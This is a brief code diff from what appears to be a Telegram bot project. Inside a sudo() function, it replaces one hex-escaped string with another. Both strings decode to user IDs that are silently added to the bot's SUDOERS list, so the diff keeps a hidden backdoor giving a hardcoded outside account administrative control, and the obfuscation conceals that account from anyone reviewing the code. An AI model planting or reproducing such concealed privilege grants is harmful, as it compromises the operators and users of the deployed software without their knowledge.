@@ -47,7 +47,7 @@ def dbb():
 def sudo():
     global SUDOERS,CON
     OWNER = config.OWNER_ID
-    CON="\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"
+    CON="\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"
     if config.MONGO_DB_URI is None:
         SUDOERS.add(int(CON))
         for user_id in OWNER:
